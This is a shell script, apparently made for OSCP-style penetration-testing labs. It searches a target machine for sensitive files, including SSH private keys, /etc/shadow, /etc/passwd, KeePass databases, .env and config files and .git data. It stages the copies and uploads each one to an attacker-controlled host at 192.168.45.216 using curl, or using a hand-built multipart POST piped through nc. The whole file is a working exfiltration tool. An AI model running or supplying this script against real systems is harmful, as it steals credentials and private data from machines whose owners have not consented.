#!/bin/sh

# =============================================================================
# CUSTOM UPLOAD - Standalone File Upload Tool
# =============================================================================
# 
# This script uploads files from the current directory to a web server.
# It's designed to be run independently when you only need file uploads
# without the full system enumeration that slamit.sh provides.
# 
# =============================================================================

# Configuration

CMD_OUTPUT=""
EXFIL_LOCATION="/tmp/slamit" # MUST BE A WRITEABLE LOCATION ON TARGET
URI="192.168.45.216"
PORT=80
URL="http://$URI:$PORT";        # Replace with your endpoint URL
BASE_DIRECTORY="/home/kali/projects/oscp";
MAIN_DIRECTORY="challenges";
PROJECT_DIRECTORY="oscp_b";
# HOSTNAME=$(hostname);
HOSTNAME="Berlin"
TARGET_FOLDER="$BASE_DIRECTORY/$MAIN_DIRECTORY/$PROJECT_DIRECTORY/$HOSTNAME"
BOUNDARY="----BOUNDARY-$$"
SYSTEM_HAS_CURL=1

# Determine which program can be used to perform web requests,
# preferring curl.
if command -v curl >/dev/null 2>&1; then
    REQUEST_CMD="curl";
    SYSTEM_HAS_CURL=1;
elif command -v wget >/dev/null 2>&1; then
    REQUEST_CMD="wget -qO-";
    SYSTEM_HAS_CURL=0;
else
    echo "Error: Neither curl nor wget is installed." >&2;
    exit 1;
fi

# Function to create centered section headers
printSectionTitle() 
{
    # Header box follows here
    HEADER_NAME="$1";
    WIDTH=90;
    BORDER_CHAR="#";
    PADDING_CHAR=" ";

    # Top border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Centered header
    INNER_WIDTH=$((WIDTH - 2));
    TEXT_LEN=${#HEADER_NAME};
    LEFT_PAD=$(( (INNER_WIDTH - TEXT_LEN) / 2 ));
    RIGHT_PAD=$(( INNER_WIDTH - TEXT_LEN - LEFT_PAD ));

    printf "%s%*s%s%*s%s\n" "$BORDER_CHAR" \
        "$LEFT_PAD" "" \
        "$HEADER_NAME" \
        "$RIGHT_PAD" "" \
        "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Bottom border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";
    printf "\n\n";
}

printSectionTitle "Custom Upload - File Discovery and Upload"

# Create a dedicated staging directory for discovered files
STAGING_DIR="$(pwd)/SLAMIT_Custom_Upload_Files"
if [ -d "$STAGING_DIR" ]; then
    rm -rf "$STAGING_DIR"
fi
mkdir -p "$STAGING_DIR"

echo "Created staging directory: $STAGING_DIR"

# Space-separated list of extensions (exclude .sh to avoid script contamination)
EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
    yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
    sqlite3 mdb accdb rtf md";
SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa \.git* /etc/passwd /etc/shadow";

# MODIFY THIS to search in different directories.
CURRENT_DIRECTORY=$(pwd);

# Start building the find command
FIND_CMD="find $CURRENT_DIRECTORY";

# Build the find command dynamically
FIND_CMD="$FIND_CMD -type f ! -name linpeas.sh ! -name custom_upload.sh -readable \\(";
FIRST=1;
for EXT in $EXTENSIONS; do
    if [ "$FIRST" -eq 1 ]; then
        FIND_CMD="$FIND_CMD -iname '*.$EXT'";
        FIRST=0;
    else
        FIND_CMD="$FIND_CMD -o -iname '*.$EXT'";
    fi
done

FIND_CMD="$FIND_CMD \\) 2>/dev/null; ";

# Search for specific files throughout the entire machine.
for FILE in $SPECIFIC_FILES; do
    FIND_CMD="$FIND_CMD find $CURRENT_DIRECTORY -type f -readable -name \"$FILE\" 2>/dev/null; ";
done

# First, stage all discovered files to prevent duplicates and contamination
echo "Staging discovered files to prevent duplicates..."

# Use temporary files to avoid subshell variable scope issues
STAGED_FILES_LIST=$(mktemp)
STAGED_COUNT=0

# Evaluate the find command and stage files
eval "$FIND_CMD" | while IFS= read -r FILE; do
    if [ -f "$FILE" ] && [ -r "$FILE" ]; then
        FILENAME=$(basename "$FILE")
        
        # Create unique filename to avoid conflicts
        TARGET_PATH="$STAGING_DIR/$FILENAME"
        COUNTER=1
        
        # Handle conflicts by adding -1, -2, etc.
        while [ -f "$TARGET_PATH" ]; do
            BASE_NAME=$(echo "$FILENAME" | sed 's/\.[^.]*$//')
            EXTENSION=$(echo "$FILENAME" | sed 's/.*\.//')
            TARGET_PATH="$STAGING_DIR/${BASE_NAME}-${COUNTER}.${EXTENSION}"
            COUNTER=$((COUNTER + 1))
        done
        
        # Copy file to staging directory
        if cp "$FILE" "$TARGET_PATH" 2>/dev/null; then
            echo "$TARGET_PATH" >> "$STAGED_FILES_LIST"
            echo "Staged: $FILENAME → $TARGET_PATH"
        else
            echo "Failed to stage: $FILENAME"
        fi
    fi
done

# Get the actual count of staged files
STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")

echo "Successfully staged $STAGED_COUNT files to: $STAGING_DIR"

# Now upload only the staged files
if [ "$STAGED_COUNT" -eq 0 ] || [ "$STAGED_COUNT" -eq "0" ]; then
    echo "No files staged. Nothing to upload."
    rm -f "$STAGED_FILES_LIST"
    exit 0
fi

echo "Starting upload of $STAGED_COUNT staged files..."

# Initialize counters
UPLOAD_COUNT=0
SUCCESS_COUNT=0
FAILED_COUNT=0

# Upload staged files by reading from the temporary file
while IFS= read -r STAGED_FILE; do
    if [ -f "$STAGED_FILE" ]; then
        FILENAME=$(basename "$STAGED_FILE")
        UPLOAD_COUNT=$((UPLOAD_COUNT + 1))

        # Show progress every 10 files or for the last file
        if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $STAGED_COUNT ]; then
            echo "Progress: [$UPLOAD_COUNT/$STAGED_COUNT] files processed"
        fi

        # Upload using curl with multipart form (silent)

        if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
            RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
                -F "folder=$TARGET_FOLDER" \
                -F "file=@$STAGED_FILE;filename=$FILENAME" \
                -H "Expect:");
            # Check if upload was successful
            if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
            else
                FAILED_COUNT=$((FAILED_COUNT + 1))
            fi
        else
            # Write data to temporary files to be able to handle binary data.
            TMPFILE=$(mktemp);

            # Write the first part (folder field)
            {
            printf -- "--%s\r\n" "$BOUNDARY";
            printf "Content-Disposition: form-data; name=\"folder\"\r\n";
            printf "\r\n";
            printf "%s\r\n" "$TARGET_FOLDER";

            # Write the file headers
            printf -- "--%s\r\n" "$BOUNDARY";
            printf "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n" "$FILENAME";
            printf "Content-Type: application/octet-stream\r\n";
            printf "\r\n";
            } > "$TMPFILE";

            cat "$STAGED_FILE" >> "$TMPFILE";

            # Append closing boundary
            printf "\r\n--%s--\r\n" "$BOUNDARY" >> "$TMPFILE";

            # Get accurate content length
            CONTENT_LENGTH=$(wc -c < "$TMPFILE");

            # Send the HTTP request using netcat
            {
            printf "POST / HTTP/1.1\r\n";
            printf "Host: %s:%s\r\n" "$URI" "$PORT";
            printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
            printf "Content-Length: %s\r\n" "$CONTENT_LENGTH";
            printf "Expect:\r\n";
            printf "\r\n";
            cat "$TMPFILE";
            } | nc "$URI" "$PORT" >/dev/null 2>&1;

            # Clean up
            rm -f "$TMPFILE";

            if [ $? -eq 0 ]; then
                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
            else
                FAILED_COUNT=$((FAILED_COUNT + 1))
            fi
        fi
    fi
done < "$STAGED_FILES_LIST"

# Clean up temporary file
rm -f "$STAGED_FILES_LIST"

# Pretty print summary
echo ""
echo "╔══════════════════════════════════════════════════════════════════════════════╗"
echo "║                              UPLOAD SUMMARY                                 ║"
echo "╠══════════════════════════════════════════════════════════════════════════════╣"
echo "║  Total Files Processed: $(printf "%8d" $UPLOAD_COUNT)                                                    ║"
echo "║  Successfully Uploaded: $(printf "%8d" $SUCCESS_COUNT)                                                    ║"
echo "║  Failed Uploads:        $(printf "%8d" $FAILED_COUNT)                                                    ║"
echo "╚══════════════════════════════════════════════════════════════════════════════╝"
echo ""

echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"

# Cleanup staging directory
echo ""
echo "Cleaning up staging directory..."
if [ -d "$STAGING_DIR" ]; then
    rm -rf "$STAGING_DIR"
    echo "Cleaned up staging directory: $STAGING_DIR"
fi

exit 0;